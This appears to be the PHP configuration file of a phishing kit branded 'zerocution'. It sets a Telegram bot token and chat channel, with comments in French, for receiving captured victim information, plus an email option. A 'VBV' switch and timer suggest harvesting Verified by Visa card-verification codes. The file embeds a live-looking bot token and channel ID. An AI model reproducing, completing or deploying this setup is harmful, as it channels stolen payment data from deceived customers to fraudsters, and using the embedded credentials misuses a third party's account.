<?php

#zerocution

# Mail
$mail_send = False;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "7961460169:AAF6YTxzgCRvXszsc7ycjHK6FWADKVVaDJg";

$rez_chat = "-1002346682852";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>